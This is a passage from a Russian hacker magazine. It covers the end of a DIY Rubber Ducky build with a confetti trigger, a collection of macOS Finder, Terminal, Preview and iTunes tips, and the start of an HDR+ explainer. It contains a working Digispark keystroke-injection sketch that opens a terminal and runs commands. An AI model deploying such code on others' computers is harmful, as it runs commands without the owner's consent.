ся — они просто часть платы SMTpad, которую я разрезал на кусочки. Ты, воз‐
можно, заметил, что я убрал подложку в том месте, где будет сопротивление
на 600 Ом для МОП‐транзистора. Это помогает избежать случайного
замыкания.





Вот как все это выглядит после пайки. Видно остатки зеленой платы флешки,
которую я разрезал.





А вот все установлено в корпус. Штекер USB хорошо бы закрепить.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

         ГОСПОДИН
  САМОУНИЧТОЖЕНИЕ
            КАК В ДОМАШНИХ УСЛОВИЯХ СМАСТЕРИТЬ
                  RUBBER DUCKY СО ВСТРОЕННОЙ
                              ПИРОТЕХНИКОЙ





ПРОГРАММИРУЕМ ATTINY85
Когда работаешь с  ATtiny из  Digispark, программирование значительно
облегчается, посколь ку бутлоадер уже есть. Откры ваешь Arduino IDE, дела‐
ешь скетч, говоришь ему загрузиться, а потом втыкаешь плату в USB.
   Кто‐то уже даже сделал конвертер под наз вани ем digiduck для уже сущес‐
твующих скриптов на Duckyscript. В качестве бонуса можно использовать
команды LIGHT ON и LIGHT OFF в скрипте, что бы сра ботал пейлоад MOSFET.
Функция LIGHT ON подает напряжение на пины 5 и 6, к которым он подклю‐
чен. Если то же самое сделать на обычной Digispark, загорится синий све‐
тодиод, который вклю чает ся, когда на пятый пин подается ток. Это очень
полезно для тестирования.
  Ниже приведен скетч, который использовался в исходном видео с кон‐
фетти. Открывается терминал, затем звук выкручива ется на пол ную громкость
и видео с Vimeo открывается на полный экран (мультик RedNoseStudio).
Ничего потрясающего с точки зрения атак через HID. На 22‐й секунде
используется  digitalWrite, чтобы подать напряжение на МОП‐транзистор.
Через три секун ды подача тока к пейлоаду прекраща ется.


#include "DigiKeyboard.h"
#define KEY_TAB 43
#define KEY_DOWN 81
#define KEY_DELETE 42
#define KEY_PRINTSCREEN 70
#define KEY_SCROLLLOCK 71
#define KEY_INSERT 73
#define KEY_PAUSE 72
#define KEY_HOME 74
#define KEY_PAGEUP 75
#define KEY_END 77
#define KEY_PAGEDOWN 78
#define KEY_RIGHTARROW 79
#define KEY_RIGHT 79
#define KEY_DOWNARROW 81
#define KEY_LEFTARROW 80
#define KEY_UP 82
#define KEY_UPARROW 82
#define KEY_NUMLOCK 83
#define KEY_CAPSLOCK 57
#define KEY_MENU 118
void setup() {
 pinMode(1, OUTPUT);
 pinMode(0, OUTPUT);
 digitalWrite(0, LOW);
 digitalWrite(1, LOW);
 DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.println("terminal");
 DigiKeyboard.delay(50);
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1500);
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.println("osascript ‐e 'set volume 4' && open https://
player.vimeo.com/video/184549201?autoplay=1");
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(22000);
 DigiKeyboard.sendKeyStroke(0);
 digitalWrite(0, HIGH);
 digitalWrite(1, HIGH);
 DigiKeyboard.delay(3000);
 digitalWrite(0, LOW);
 digitalWrite(1, LOW);
}
void loop() {
}

Можешь заметить, что digiduck переводит LIGHT ON/OFF как digitalWrite
с параметрами (0, HIGH) или (1, HIGH). Это соот ветствует пину 5 (0) или 6
(1) на ATtiny. Это означает нес колько светоди одов или в этом слу чае несколь‐
ко триггеров.


УБИРАЕМ ПЯТИСЕКУНДНУЮ ЗАДЕРЖКУ ПРИ СТАРТЕ
Одно из раздражающих свойств Digispark — это пятисе кундная задержка
при загрузке. Именно эта задержка позволяет загружать новые скетчи
при подклю чении. Если ее убрать, то для загрузки программы нужно будет
замыкать два пина ATtiny. Для борь бы с задержкой понадобится новый заг‐
рузчик. Загрузить его можно при помощи программатора, но куда веселее
использовать уязвимость типа «скольжение по цепочке NOP» (NOPslide), что‐
бы загрузить его из памяти, которая обычно используется для скетчей. Одна‐
ко для записи прошив ки все равно понадобится убрать некоторые предох‐
ранители внутри чипа. А это, к сожалению, все же требует использовать
высоковольтный (12 В) программатор. Говорят, в некоторых версиях Digispark
биты‐предохранители не выставлены, но в моей они были.


ВЫСОКОВОЛЬТНЫЙ ПРОГРАММАТОР
Если ты выберешь путь с высоковольтным программатором, то тут большой
выбор устройств — например, долларов за 60. Однако вполне можно обой‐
тись Arduino Nano v3 за 4 доллара и макетной платой. Кто‐то сделал скетч
для Arduino, который автоматичес ки очи щает предохранительные биты, что
для нас очень удоб но. Шаги 1–3 из руководства по этой опе рации привели
меня к желаемому результату.
  Вместо того чтобы подключать ATtiny напрямую к макетке, я использовал
зажим SOIC‐8, чтобы программировать чип напрямую. Также я заменил две‐
надцативольтовую батарейку на пятивольтовый бус тер за 5 баксов. Все это я
так часто использовал, что перенес с макетной пла ты на более постоянную
ProtoBoard.





ПИШЕМ НОВЫЙ ЗАГРУЗЧИК
Теперь, когда предохранители удалены, мы можем загружать новый бут‐
лоадер. Как я уже говорил, ты можешь сделать это при помощи программа‐
тора. С минимальными изменениями сгодится уже использованный нами
высоковольтный программа тор. Но это далеко не так весело, как что‐то, что
делать не предполагалось.
  Существует проект micronucleus, в рамках которого раз рабаты ваются
новые прошивки. Если покопаться в глубинах это го проекта, то найдется ути‐
литка под названием upgrade, которая исполь зует скольжение по NOP
для загрузки новых бутлоадеров по USB. Ты пишешь micronucleus Boot‐
loaderName.hex — и готово. Я использовал бинарную версию micronucle‐
us‐1.11‐entry‐jumper‐pb0‐upgrade.hex. Помни, что после изменения заг‐
рузчика пропадет пятисекундная задержка и у тебя больше не будет воз‐
можности замыкать первый и пятый контакты (или другие, если у тебя дру гой
бутлоадер) на землю, что бы залить новый скетч для ATtiny.

Ту‑ду и виш лист
 • Нормальная печатная плата для удобства пайки;
 • возможность получать пользовательский ввод и рас ширить потенциаль‐
  ный набор функций.




ФЕЙЛЫ
Я не записывал каждый шаг, но у меня оста лись фотографии нескольких фей‐
лов, случившихся в процес се.
   Digispark и MOSFET.





Первый тест пятивольтового триггера.





Попытка уменьшить Digispark в надежде все же упихать его в корпус флешки.





Попытка приделать контакты к корпусу SOT‐23 МОП‐транзистора, чтобы
использовать его на макетной плате. Ножки отва лились, стоило взять его
в руки.





А на втором снимке — более удачная попытка поместить MOSFET на макет‐
ную плату. Это первый раз, когда я испы тал всю прелесть медной ленты!
ТРЮКИ





                                                                        Андрей Письменный
                                                                                   Шеф‐редактор
                                                                                     apismenny@gmail.com
       MACOS
  TIPS’N’TRICKS

                  ПОЛЕЗНЫЕ ВЕЩИ,
            О КОТОРЫХ СТОИТ ЗНАТЬ
                КАЖДОМУ МАКОВОДУ




Можно по‐разному относиться к тому, что macOS — это
монолитная среда, но нельзя недооце нивать плюс такого
подхода:  эта  операционка  просто  набита  маленькими
и большими фиш ками, которые упрощают повседневную
жизнь. Однако не все они очевидны сразу. В этой статье мы
в отдельнос ти рассмотрим компонен ты системы и прилага‐
емый софт, чтобы обна ружить око ло полусотни инте ресных,
но скрытых от глаз полезностей.


В пре дыду щих выпус ках
Эта статья планировалась как первая в серии статей про macOS. Вместо нее
мы тогда сде лали сводную статью, где были и советы, и скры тые нас тройки
системы, и рекомендации по выбору программ. А потом перешли к изу чению
утилит командной строки и автоматизации работы при помощи launchd.
Теперь, чтобы наверстать, подробнее воз вра щаемся к скрытым фичам сис‐
темы.



ИНТЕРЕСНОЕ В FINDER
Finder — это бессменный (в том числе буквально) файловый менеджер mac‐
OS. Но в реальности это, оказывается, целых шесть исполняемых файлов,
которые хит ро передают управление друг другу и сосуществуют в рамках
одной  программы.  Увидеть  их  все  ты  можешь,  заглянув  по  адре су
/System/Library/CoreServices/Finder.app/Contents/Applications/
(жми Cmd‐Shift‐G и вставляй этот путь).





Здесь есть отдельные приложения для AirDrop, iCloud Drive, Network, All My
Files и Recents (по сути, заранее нас троенные окна с поиском) и Computer.
Каждый из них можно при желании вытащить в док для более прос того дос‐
тупа — они будут просто открывать нужные окна.
  Но вернемся к самому Finder. По умолчанию его внешний вид минималис‐
тичен, но ты можешь дополнительно включить строку состояния, строку пути
и окно просмотра (Status Bar, Path Bar и Preview) в меню «Вид».





         Обрати внимание на две стро ки в нижней части окна


             INFO

                     Возможность включить  панель предпросмотра
                      не только в колоночном режиме, но и в других —
                           это, похоже, задел на новую фичу Finder в macOS
                         10.14 Mojave. Там эта панель заиграет новыми
                       красками.


Строка статуса раньше была вклю чена по умол чанию: она показы вает, сколь‐
ко файлов в текущей папке и сколько места сво бодно на диске; строка пути —
менее известная вещь, хотя что‐то похожее есть и в Windows, и в линуксов‐
ских DE. Это удоб ный путь к текущей папке, к каж дому элементу которого
можно перейти. Обрати внимание, что тут эти крошечные папочки можно
еще и таскать — скажем, чтобы переложить в другое место, либо наобо‐
рот — таскать файлы на них.
  Еще один неочевидный трюк с перетягиванием доступен в окне свой ств
файла (оно открывается по Cmd‐I). Любой программе, ярлыку или документу
можно присвоить кастомную иконку, если перетащить ее на значок в верхней
части панели свойств. Все, что нуж но для это го, — файл .icns. Где его взять?
Проще всего — сделать утилитой iconutil, а на Stack Overﬂow есть отличный
скрипт, который генерирует .icns с иконками всех нужных раз меров из кар‐
тинки в PNG.
   Кстати, если про меню свойств файла все обычно знают, то меню
«Параметры вида» (Cmd‐J) — менее известная фича. Это нас тройки отоб‐
ражения содержимого, которые Finder хранит для каждой папки, в том чис‐
ле — и для рабочего стола.





   Для режима отоб ражения в виде значков и для режима списка эти нас‐
                            тройки разные

Еще занятно, что для каждой папки мож но задать свои размер шрифта и цвет
фона. Можно даже сделать фон с картинкой — именно так, кстати, и делают
окна Finder, которые ты видишь при уста новке программ из .dmg.


Прос тые фиш ки
Вот несколько советов для тех, кто только начина ет осваивать macOS. Впро‐
чем, я встречал и таких пользователей, которые годами работают на «маке»
и не разведали некото рых пунктов из это го списка.
 • Настрой Time Machine. Это удоб нейшая вещь для отката правок в любом
   документе. Система сама сохраняет дельты локально на твоем диске
   и следит за тем, чтобы они не занимали слиш ком много места. В боль‐
  шинстве программ из меню «Файл → Вернуть ся к версии → Прос мотреть
   все версии» (File → Revert to → Browse All Versions) ты можешь перейти
   к сравнению вер сий. Но и бэкап на внешний диск (автоматом при подклю‐
   чении) или NAS настроить тоже не помеша ет.
 • Используй QuickLook! Это встроенный в систему прос мотрщик докумен‐
   тов, который появляется при нажатии на про бел при выбранном файле.
   Забавная фича: если выб рать нес колько документов, то в QuickLook их
  можно будет разложить плиткой.
 • Ты можешь подсматривать пароли в «Связ ке клю чей». Сложно не узнать
  о том, что в macOS встро ена система хра нения паролей — Keychain.
  Однако не все доходят до утилиты «Связка клю чей» (Keychain access),
   которая позволяет управлять этими паролями, а также узнавать их в случае
   надобности, вводя пароль от системы. Прос то дважды кликай на любой
   пароль и ставь галочку «Показать пароль».
 • Не ищи пункты меню гла зами. Для уско рения поисков ты можешь нажать
   «Справка» и начать печатать его название. «Макось» подскажет тебе вари‐
   анты и наглядно покажет, где надо было смотреть.





 • Загляни в настрой ки клавиатуры, там есть мас са полезного. Например,
   автозаме на — в том чис ле обычных кавычек на парные елочки и коротких
   тире — на длинные (только не забудь включить ее в редакторе, как на
   скриншоте выше). В соседней вкладке — наз начение шоткатов  (ты
  можешь сам вписать команду из меню любой программы и задать сочета‐
   ние клавиш), а также настройки переключения рас кладки — можно занять
   этим Caps Lock или включить опцию, при которой сис тема помнит рас‐
   кладку для каждого документа.
 • Ты можешь создавать сети Wi‐Fi, это умеет любой «мак». Бывает удобно
   для раздачи проводного интернета с ноут бука либо когда нужно на ходу
  именно создать сеть, а не перекинуть файл по AirDrop. Просто нажми
   на значок Wi‐Fi в меню и выбери «Соз дать сеть» (Create Network).
 • Смотри содержимое специальных папок при помощи пункта «Показать
   содержимое пакета» контекс тного меню. Программы, библиотеки iTunes
   и Photos, дистрибутивы — все это специальные типы папок, для которых
   на двойной клик завяза но какое‐то действие. Но это не значит, что ты
   не можешь заглянуть внутрь.
 • Попробуй зажать Control и покрутить колесиком мыши. Система сделает
   зум на часть экрана рядом с курсором. Трюк неплохо помогает, когда нуж‐
   но разглядеть что‐нибудь мелкое.
 • Еще фича из той же серии: попробуй держать Shift во время некоторых
   зашитых в систему анимационных эффектов, они будут происходить
   замедленно. Например, можешь подержать Shift и нажать на одну из папок
   в правой части дока. Удобно, если нужно сделать скриншот в процессе.
 • Таскай файлы прямо из заголовков окон. Это одна из моих любимых мел‐
   ких фич: значок файла в заголовке окна с документом представляет файл
   точно так же, как и значок в Finder. Нап ример, можно взять и перетащить
   в другое место.
 • Перетаскивай файлы и пап ки на диалоги открытия и сохранения. Если
   перетащить папку, то ты перейдешь в нее, если файл, то он окажется выб‐
   ран. Иногда бывает мегаполезно.
 • Прочитай о назначении активных углов и секретах кнопки Alt в начале
   статьи «Обвес macOS». Не будем повторяться — впереди еще много все‐
   го занимательного!




ПРОДВИНУТЫЕ ТЕХНИКИ РАБОТЫ С «ТЕРМИНАЛОМ»
Вопреки  расхожему  мнению,  ориентированность  интерфейса  macOS
на простых смертных вовсе не мешает ей иметь в арсенале все необходимое
продвинутому пользователю. Одна из таких вещей — эмулятор терминала.
И если когда‐то давно он был простень ким и непритязательным, то теперь он
неплохо смотрится в сравнении со сторонними ана логами.





Цветовые профили и сохранение групп окон ты без труда най дешь в настрой‐
ках. Я, кстати, дол го не ценил профили, но теперь под каждое дело настра‐
иваю терминал своего цвета, со своими нас тройками и стартовыми коман‐
дами. Черный — универсальный, синий — для работы с удаленным сервером,
зеленый — для Raspberry Pi, бежевый — для Python и так далее. Рекомендую
придумать подоб ную схему для твоих задач — это удобно и помогает легче
ориентироваться.
   Также хочу обратить твое внимание на механизм меток и закладок. Если ты
зажмешь Cmd и понажимаешь курсорные стрелки вверх и вниз, то увидишь,
что терминал скачет по твоим командам. Работа ет это просто: при вводе каж‐
дой из них по умол чанию создавалась метка, меж ду которы ми ты теперь
и переходишь.





При желании можешь пос тавить свою мет ку (Cmd‐U) или положить метку
в закладки (Cmd‐Alt‐U) и даже задать ей наз вание. Еще удобно копировать
текст, переходя между метками (Cmd‐Shift‐стрелки) и стирать текст до пре‐
дыдущей метки (Cmd‐L). Пос леднее полезно, когда какая‐то команда вдруг
выплюнула неожиданно много текста и он меша ет. Кстати, все это работает
не только с командными интерпретаторами вроде bash и zsh, но и с любыми
другими интерак тивными программа ми — например, тем же питоновским
REPL.
   Ну и моя любимая фича: юниксовский man элегантно совмещен с маков‐
ской справ кой. Вводи название команды в поисковую строку в меню «Справ‐
ка» и выбирай нужный пункт. Описание команды откроется в новом окне
с приятным желтым фоном.


СКРЫТАЯ СИЛА PREVIEW
Пожалуй, Preview («Просмотр») — это самая недооце ненная программа
из всего стандартного набора macOS. Обычно ее считают простым прос мот‐
рщиком картинок и PDF, но на деле она способна гораз до на большее. Нес‐
мотря на то что в Preview нельзя рисовать кистью или ретушировать фотог‐
рафии, их тем не менее можно обра баты вать, в том числе массово.
  Все доступные инстру менты ты найдешь в меню «Инструменты» (Tools).
Среди них — цве токор рекция (кривых тут нет, но есть уровни), обрезка, мас‐
штабирование и аннотиро вание, нужное, когда захочется нарисовать на кар‐
тинке большую красную стрелку или обвести область. Кроп, кстати, делается
предельно просто: открываешь фотографию, выделяешь на ней прямоуголь‐
ную область, жмешь Cmd‐K и сохраня ешь.





Но настоящая сила Preview — в мас совой обработке картинок. Если ты
выделишь несколько файлов и откроешь их в Preview (Cmd‐O, перетаскивани‐
ем на док или просто выдели их в диалоге «Открыть»), то увидишь, что
появился сайдбар со списком. Теперь выделяй в нем нужные картинки, и все
операции будут применяться к ним одновременно.





Preview даже может под рабатывать простень ким редактором PDF. Например,
менять страницы местами мож но прос тым перетя гиванием в сайдбаре.
А если нужно добавить стра ницу из другого документа, то просто открой оба
и перетяни из одного сайдбара в другой. Точно так же можно перетянуть
сюда любой файл с картинкой.
  Нужно создать PDF с нуля из нес кольких картинок? Тут пригодится другой
трюк. Открой картинки в Preview и отправь их на печать. В диалоге нас тройки
страницы и выбора принтера жми на кнопочку PDF вни зу и сохраняй. Эта фун‐
кция доступна и в других программах, а раз работчикам Chrome она так приг‐
лянулась, что они сделали такую же и в версии для Windows. :‐)





Ах да, чуть не забыл: попробуй при прос мотре картинки в Preview пос тавить
на тачпад два пальца на рас стоянии пары сантиметров друг от друга и пок‐
рутить так, будто ты поворачиваешь на столе листок бумаги. Круто? Жаль,
с тех пор как Джобс показывал первый MacBook с мультитачем, эта функция
так дальше Preview и не ушла.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
 MACOS TIPS’N’TRICKS
         ПОЛЕЗНЫЕ ВЕЩИ, О КОТОРЫХ СТОИТ ЗНАТЬ
                         КАЖДОМУ МАКОВОДУ





НЕОЧЕВИДНЫЕ СТОРОНЫ ITUNES
С момента первого релиза в 2001 году iTunes из простенького музыкального
плеера превратился в чудовищный комбайн, где чего только нет: от прожига
музыкальных компакт‐дисков  (да‐да,  эта функция по‐прежнему с нами
в iTunes 12 и находится в меню «Файл») до рас ста новки значков на экранах
iPhone и iPad.
  Мой любимый трюк, свя занный с iTunes, совсем прост, но невероятно
полезен. Лет этак десять назад на одну из версий iTunes добавили неболь‐
шую оранжевую стрелочку, которая позволяла вернуться к тому месту, где ты
вклю чал музыку. Стрелку потом убра ли, но кла виатурный шоткат остался:
нажав Cmd‐L, ты сможешь моментально выб раться из любых дебрей и вер‐
нуться к альбому или плей‐лис ту, который слушаешь.
  Еще хочу обратить твое внимание на такую полез ную вещь, как мини‐пле‐
ер. На верхней панели есть кнопка, которая покажет его, убрав основное
окно, но иногда удоб но иметь и то и дру гое. Просто кликни на пункт
«Мини‐плеер» в меню «Окно», и он появится рядом с основным окном. Край‐
не  удобно  для  управления  спис ком  «Воспроизвести  далее»  (Up
Next) — можешь перетягивать песни из одного окна в другое. С недавних пор
есть  аналогичное  выпада ющее  меню,  но  мой  выбор  по‐прежнему
за «Мини‐плеером».





Если говорить о продвинутых функциях iTunes, то тут на ум, конечно, сразу
приходят умные плей‐листы (Smart Playlist). Подробно останавливаться на них
не будем: если еще не про бовал эту замечательную фичу, просто создай
такой плей‐лист из меню «Файл → Новый смарт‐плей‐лист» и поиграйся
с фильтрами. Ты либо тут же найдешь им полез ные примене ния, либо пож‐
мешь плечами и продол жишь слушать музыку, как слу шал раньше.
   Куда менее очевидная вещь — это воз можность при помощи iTunes кон‐
вертировать файлы между разными форматами и изме нять длину тре ков.
Для конвертации в первую очередь нужно задать формат по умол чанию —
это делается в настрой ках (кнопка «Настройки импорта» в «Основных»). Если
в поле «Настройка» выбрать «Пользовательская», то можно будет задать
более тонкие настрой ки кодека.





Теперь выбирай любой трек и из меню «Файл → Конвертация» можешь соз‐
дать его копию в выбранном формате. Например, «Создать версию в фор‐
мате MP3», если был выбран MP3.
  При желании можешь укоротить трек, это делается из его свойств. Выбери
нужную композицию, нажми Cmd‐I («Сведения о песне») и переходи во вклад‐
ку «Параметры» (Options). Поля «начало» и «конец» указывают, где начинать
и где заканчивать воспроизведение. Файл при этом не пос традает —
это просто метки, которыми будет руководствовать ся пле ер.





Комбинация из этих двух трюков поз воляет соз давать кастомные рингтоны
для iPhone из любой песни без допол нительных утилит. Сначала выбери
в свойствах тре ка нужное время начала и окончания, затем конвертируй
в AAC  (сконвертируется  только выбранный  кусочек),  перетаскиванием
вытащи его из iTunes на рабочий стол и поменяй расширение с .m4a на .m4r.
Стирай из iTunes старую версию (ту, что вышла пос ле конвертации) и клади
назад .m4r. Все, теперь оста лось только переб росить получившийся рингтон
в iPhone и выбрать в качестве звонка.


ПРОФЕССИОНАЛЬНЫЕ ФИЧИ PHOTOS
В 2014 году в Apple решили отправить на покой про фессиональный фоторе‐
дактор Aperture и вместо это го сконцентрировать силы на разработке прог‐
раммы Photos, которая заодно заменила iPhoto и ста ла частью операционной
системы. Photos пока еще не успела обрасти дос тойным количес твом фич —
как скрытых, так и легко заметных. Одна ко некоторый задел на будущее есть.
  В Photos, например, уже реализова на возможность копировать нас тройки
между снимками. К примеру, если у тебя есть десяток похожих кад ров, сде‐
ланных при одном и том же освещении, ты можешь пошаманить над одним
из них, а затем в меню «Изображение» найти пункт «Скопировать корректи‐
ровки» (Cmd‐Shift‐C). Теперь пройдись по осталь ным девяти снимкам, жми
Cmd‐Shift‐V и смотри, подойдут ли им изменения.





Из профессиональных фоторедакторов перекочевала и другая полезная фун‐
кция: возможность подстроить дату и время для целой серии фотографий.
Случается, что в фото аппарате стоят неп равильные настройки, и тогда
импортированные снимки улетят в тай млайне куда‐нибудь не туда. Но не
беда: выбираешь в меню «Изоб ражение» пункт «Нас троить дату и вре мя» (Ad‐
just Date and Time) и задаешь верные данные для первого кадра. Для осталь‐
ных эта информация будет подстроена автомати чески, исходя из раз ницы
во времени между снимками.





Photos неплохо поддерживает формат RAW, одна ко если ты снимал пары
RAW+JPEG, то по умол чанию будет использован JPEG (это отмечается буквой
J в углу снимка). Чтобы работать с RAW, нужно перейти в режим редактирова‐
ния и выбрать «Использовать RAW в качес тве оригинала» (Use RAW as Origi‐
nal) в меню «Изображение».
  Все это мило, но разрыв между Photos и Aperture (и тем более Adobe Light‐
room) по‐прежнему колоссальный. Раз ве что можешь попытаться расширить
набор функций при помощи (довольно недешевых) плагинов из App Store.


ПУСКАЕМ ЗВУК В НЕСКОЛЬКО ПАР НАУШНИКОВ ОДНОВРЕМЕННО
Случается, что нужно подключить к одному «маку» несколько пар наушников
или динамиков, причем чтобы звучали они одновременно. Ну, например,
хочешь ты вдвоем с кем‐нибудь пос мотреть фильм в шумном помещении.
У вас есть блютусная стереогарнитура и обычные наушники, но как сделать,
чтобы звучало сразу и то и дру гое?
  На помощь в этом случае придет утилита «Нас трой ка Audio‐MIDI» из папки
«Утилиты». В нижнем левом углу этой непримет ной программулины есть кноп‐
ка «+», которая открывает меню из пары пунктов. Выбирай «Создать многовы‐
ходное устройство» (Create Multi‐Output Device) и в правой части окна выс‐
тавляй галочки «Вкл.» напротив тех устройств, которые хочешь добавить
в свой сетап. Допол нительно можно отметить гал ки «Коррекция смещения»,
но разницы я не заметил.





Когда все будет готово, нажимай на значок динамика в верхнем правом углу
экрана, и в выпадающем списке увидишь «Мно говыходное устрой ство» (или
что‐то другое, если ты его переименовал). Выбирай его, и готово! Отдельно
отмечу, что VLC не очень‐то жалует системные настройки зву ка и в нем, ско‐
рее всего, придется выбрать наше мегаустройство отдельно («Аудио → Ауди‐
оустройство → Многовыходное устройство»).


ЗАХВАТЫВАЕМ И РЕЖЕМ ВИДЕО В QUICKTIME
Современному QuickTime Player в плане раз весистости далеко до классичес‐
кого QuickTime, не говоря уже про версию Pro. Однако и здесь есть несколько
интересных штуковин. В первую очередь это возможность записывать звук,
видео или даже происходящее на экране компьютера. Впрочем, последнее
в macOS Mojave перенесут в системную ути литу для захвата скриншотов.
  Секретными эти функции можно назвать раз ве что с натяжкой: это первые
три пункта в меню «Файл». Выбирай нужный, и откроется окно с предпрос‐
мотром. Обрати внимание: рядом с кноп кой записи есть небольшая стрел ка.
Она открывает настройки источников ввода, причем аудио и видео можно
задать отдельно.





Если ты подключишь к компь ютеру устройство на iOS, откроешь новое окно
для записи видео в QuickTime и в качес тве источни ка ввода выберешь свой
девайс, то… нет, не уга дал, его камера не будет задействована для записи.
Вместо это го ты увидишь экран сво его айфона или айпада и сможешь
записать видео с демонс тра цией какой‐нибудь программы. Странно, что
для этого выбрали «видеоза пись», а не «запись экра на», но круто, что такая
функция вообще есть.
  Записав видео, ты всегда можешь подрезать его, не выходя из QuickTime.
Соответствующие инструменты ты найдешь в меню «Правка». Впрочем, вряд
ли этим сейчас кого‐то удивишь — те же функции с выходом Mojave появятся
даже в QuickLook.


НАСТРАИВАЕМ АВТОИМПОРТ ФОТОГРАФИЙ В ПАПКУ
Под конец хочу рассказать о большой тайне программки «Захват изоб‐
ражений» (Image Capture), которую ты можешь най ти в папке «Программы».
Нужна она для импорта изоб ражений с фотокамер, карт SD, сканеров и под‐
клю ченных проводом устройств с iOS.
  На первый взгляд ничего особен но интересного в этой утилите нет: знай
выбирай картинки и перетас кивай в нужную папку, а потом можешь удалить
с устройства. Однако тут кроется крошечная, но очень важная деталь. Именно
в «Захвате изображений» назначается, какая прог рамма будет автоматически
открываться, когда ты подклю чаешь определенное устройство, содержащее
изображение.
  Видишь микроскопическую стрелку в нижнем левом углу окна? Если вдруг
не видишь, то подключи и выбери в сайдбаре какое‐нибудь устройство. Выд‐
винув поразительно неприметное меню снизу, ты можешь выбрать одну
из  программ,  куда  авто матичес ки  будут импортироваться  фотографии
при подклю чении конкретного устройства.





В конце этого списка есть шту ка под названием AutoImporter. Если выбрать
ее, то картинки будут авто матом засасываться не в какую‐то программу, а в
папку Pictures/AutoImport в твоем домашнем каталоге. Сменить эту папку
тоже можно. Для это го перейди по пути /System/Library/Image Capture/
Support/Application, запус ти AutoImporter и открой его настройки. Можешь
даже сделать по отдельной папке на каждый фотоаппарат, если у тебя их нес‐
колько.


ЗАКЛЮЧЕНИЕ
Тут и там в статье я писал, что какая‐то из упо мяну тых фишек мне особенно
нравится. Это, на самом деле, касается вооб ще всего списка. Я попытал ся
вспомнить все, чем часто пользуюсь и на что, бывало, кому‐то откры вал гла‐
за. У другого автора наверняка бы получился другой список, так что, если
тебе есть что допол нить, смело пиши в коммента риях!
ТРЮКИ

ИДЕАЛЬНОЕ
ФОТО





   Денис Погребной

                     ЧТО ТАКОЕ HDR+
            И КАК АКТИВИРОВАТЬ ЕГО
               НА СВОЕМ СМАРТФОНЕ





Камеры смартфонов линейки Pixel и Nexus никогда не пред‐
ставляли собой ничего выда ющегося, но за последние
четыре года сде лали мощный рывок вперед и теперь
занимают первые строчки рейтингов. Почему так произош‐
ло? Потому что Google внедрила программный механизм
постобработки фотографий под названием HDR+. В этой
статье мы рас скажем, как он работает и как активировать
HDR+ на своем смартфоне, независимо от его марки.


ЧТО ТАКОЕ HDR
Для полного понимания принципа работы HDR+ придется для начала разоб‐
раться с обычным HDR.
  Основная проб лема всех камер смартфонов — маленький раз мер мат‐
рицы и, как следствие, недостаточный охват динамичес кого диапазона. Что‐
бы исправить этот недос таток, был разработан алго ритм HDR (High‐Dynamic
Range), принцип работы которо го следующий: камера делает кадр со стан‐
дартным для дан ной сцены уровнем экспозиции, затем делает недоэкспо‐
нированный кадр, на котором будут четко видны лишь пересвеченные
области изначального снимка, далее выполняется переэкспонированный
снимок, на котором видны только затем ненные детали изначального снимка,
а все остальное пересвечено. Далее снимки накладываются друг на друга
и объединяются при помощи специальных алгоритмов, качество которых
зависит от производителя софта камеры. В результате получается снимок
с хорошей проработкой деталей как в тенях, так и в более светлых мес тах.
  Недостатки HDR очевидны: долгое время съемки приводит к тому, что
попавшие в кадр движущиеся объекты будут двоиться, а даже небольшая
тряска смажет картинку.


ЧТО ТАКОЕ HDR+
Умные головы придумали алго ритм, лишенный недостатков HDR. Впрочем,
общее с HDR у него одно лишь наз вание.
  HDR+ расшифровывается как High‐Dynamic Range + Low Noise. Свою
известность он получил за ряд выдающихся возможностей: алгоритм спо‐
собен устранять шумы практически без потери детализации, повышать качес‐
тво цветопередачи, что крайне важно при пло хом освещении и по краям кад‐
ра, вместе с этим он сильно расширя ет динамичес кий диапазон фотографии.
HDR+, в отличие от стандартного HDR, почти не боится тряс ки смартфона
и движения в кадре.
  Первым смартфоном с поддержкой HDR+ стал Nexus 5. Из‐за не самого
лучшего баланса белого и малень кого отверстия диаф рагмы (f2.4) камера
этого смартфона считалась не более чем крепким середнячком. Все изме‐
нилось с выходом обновления Android 4.4.2. Именно оно принесло с собой
поддержку режима HDR+ и изумитель ное качес тво ночных снимков. Они хоть
и не отличались большой яркостью по всему полю кадра, но благодаря HDR+
практически не содержали шума при сохранении мелких деталей и обладали
превосходной (для смартфо нов 2013 года) переда чей цветов.





                          Nexus 5 + HDR+

(Изображение в исходном качестве )



ИСТОРИЯ СОЗДАНИЯ HDR+
Как же компания, никог да не занимавшаяся камерами, создала алгоритм,
который творит чудеса, используя обычные, по меркам флагманов, камеры
Nexus и Pixel?
  Все началось в 2011 году, когда Себастьян Трун (Sebastian Thrun), глава
компании Google X (теперь уже просто X), подыскивал камеру для очков
дополненной реальности Google Glass. Массогаба рит ные тре бования предъ‐
являлись  очень жесткие.  Размер  матрицы камеры  должен был  быть
еще меньше, чем в смартфонах, что крайне плохо сказывалось бы на динами‐
ческом диапазоне и приводило бы к появлению множества шумов на фотог‐
рафии.
  Выход оставался один — попытаться улучшить фотографию программно,
с помощью алгоритмов. Эту задачу должен был решить Марк Левой (Marc
Levoy), преподаватель факультета информа тики Стэнфордского уни вер‐
ситета, эксперт в области вычислительной фотографии. Он занимал ся тех‐
нологией захвата и обра ботки изображений на базе программного обес‐
печения.
  Марк сформировал команду, известную как Gcam, которая занялась изу‐
чением метода Image Fusion (сплавление изоб ражений), основанного на объ‐
единении  серии  снимков  в  один  кадр.  Фотографии,  обработанные
при помощи этого метода, получа лись более яркими и рез кими, имели малое
количество шумов. В 2013 году технология дебютировала в Google Glass,
а затем, в этом же году, переименованная в HDR+, появилась в Nexus 5.





               Еще один ночной снимок с Nexus 5

(Изображение в исходном качестве )



КАК РАБОТАЕТ HDR+
HDR+ — чрезвычайно сложная технология, детально разобрать которую
в рамках данной статьи невоз можно. Поэтому мы рассмотрим общий прин‐
цип работы, не останавливаясь на деталях.


Фун дамен тальный прин цип
После нажатия кнопки спус ка затвора камера захватывает серию недоэкспо‐
нированных (с короткой выдержкой) кадров (это нужно для сохранения мак‐
симального количества деталей на снимке). Количес тво кад ров зависит
от сложности усло вий освещения. Чем темнее сцена или чем больше деталей
